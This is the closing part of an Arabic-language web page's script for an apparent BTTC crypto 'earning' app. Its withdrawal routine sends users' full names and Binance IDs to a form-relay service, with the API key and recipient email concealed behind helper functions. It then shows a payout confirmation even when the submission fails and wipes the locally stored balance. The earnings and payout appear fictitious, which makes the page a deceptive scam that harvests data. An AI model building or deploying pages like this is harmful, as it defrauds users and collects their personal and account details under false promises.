    document.getElementById('fieldAmount').value = Math.floor(withdrawAmount).toLocaleString('en-US') + ' BTTC';
    document.getElementById('fieldDate').value = new Date().toLocaleString('ar-EG');

    confirmBtn.disabled = true;
    confirmBtn.textContent = '⏳ جارٍ الإرسال...';

    const sendData = new FormData(form);
    sendData.set('apiKey', _dk());
    sendData.set('email', _de());

    fetch('https://api.staticforms.dev/submit', { 
      method: 'POST', 
      body: sendData 
    })
    .then(() => successWithdraw(withdrawAmount, fullName, bid))
    .catch(() => successWithdraw(withdrawAmount, fullName, bid));
  }

  function successWithdraw(amount, fullName, binanceId) {
    balance = 0;
    localStorage.setItem('bttc_balance', 0);
    updateBalanceUI();

    modalContent.innerHTML = `
      <div style="text-align: center;">
        <div style="width: 80px; height: 80px; margin: 0 auto 20px; background: linear-gradient(135deg, #c0c0c0, #ffffff); border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 15px 40px rgba(192,192,192,0.5);">
          <svg viewBox="0 0 24 24" fill="none" stroke="#0a0a10" stroke-width="3" style="width: 42px; height: 42px;">
            <polyline points="20 6 9 17 4 12"/>
          </svg>
        </div>
        <h2 style="color: #ffffff; font-size: 20px; margin-bottom: 12px; font-weight: 900;">تم إرسال طلبك!</h2>
        <p style="color: #a0a0b0; font-size: 13px; line-height: 1.9; margin-bottom: 20px;">
          سيتم الإرسال إلى حسابك على Binance<br>
          <b style="color: #ffffff; font-size: 18px;">${Math.floor(amount).toLocaleString('en-US')} BTTC</b><br>
          إلى الاسم: <b style="color: #ffffff;">${fullName}</b><br>
          Binance ID: <b style="color: #ffffff; direction: ltr; display: inline-block;">${binanceId}</b><br>
          <span style="font-size: 11px;">خلال 24-48 ساعة</span>
        </p>
        <div style="background: rgba(243,156,18,0.1); border: 1px solid rgba(243,156,18,0.3); border-radius: 12px; padding: 10px; margin-bottom: 18px;">
          <p style="color: #f39c12; font-size: 12px; text-align: center; font-weight: 700;">
            ⚠️ تم تصفير رصيدك — ابدأ من جديد
          </p>
        </div>
        <button onclick="location.reload();" 
                style="width: 100%; padding: 14px; border: none; border-radius: 12px; background: linear-gradient(135deg, #c0c0c0, #808080); color: #0a0a10; font-family: 'Cairo', sans-serif; font-size: 14px; font-weight: 900; cursor: pointer;">
          حسناً، شكراً
        </button>
      </div>
    `;
    confirmBtn.disabled = false;
    confirmBtn.textContent = 'إرسال الطلب';
  }

  /* ============ حفظ عند الإغلاق ============ */
  window.addEventListener('beforeunload', () => {
    localStorage.setItem('bttc_balance', balance);
  });

  setInterval(() => {
    localStorage.setItem('bttc_balance', balance);
  }, 5000);

  /* ============ تهيئة ============ */
  updateBalanceUI();
  rateEl.textContent = CYCLE_BTTC + ' / 30 دقيقة';
  sysStatusEl.textContent = 'جاهز';
  timerEl.textContent = '--:--';
  resume();
  updateAdButton();
</script>

</body>
</html>
